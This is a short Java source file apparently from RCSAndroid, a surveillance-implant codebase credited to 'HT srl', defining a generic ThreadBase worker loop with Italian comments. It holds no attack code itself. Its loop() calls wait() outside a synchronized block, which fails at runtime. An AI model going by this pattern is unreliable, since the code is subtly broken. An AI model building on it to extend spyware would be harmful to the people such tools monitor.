/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI;

import java.nio.ByteBuffer;

import android.util.Log;

public abstract class ThreadBase extends Thread {
    private long delay = Long.MAX_VALUE;
    private boolean stopped;
    private boolean caffe;
    
    protected ByteBuffer myConf;
    protected int status;
    
    public abstract void go();
    
	protected void loop() {
		 while (!stopped) {
            if (caffe) {
                // fai il caffe'....
            }
            
            go();

            try {
                wait(delay);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            
            Log.d("RCS", "ThreadBase Running");
       }
	}
	
	   // riesegue l'actualRun
    public synchronized void next() {
        if (!stopped) {
            notify();
        }
    }

    // ferma il thread
    public synchronized void stopThread() {
        if (!stopped) {
            stopped = true;
            notify();
        }
    }

    //definisce il delay al prossimo giro
    public void setDelay(int delay) {
        this.delay = delay;
        next();
    }

    public synchronized int getStatus() {
    	return status;
    }
    
    // fai il caffe'.
    public void faiCaffe(){
        caffe = true;
        notify();
    }
}
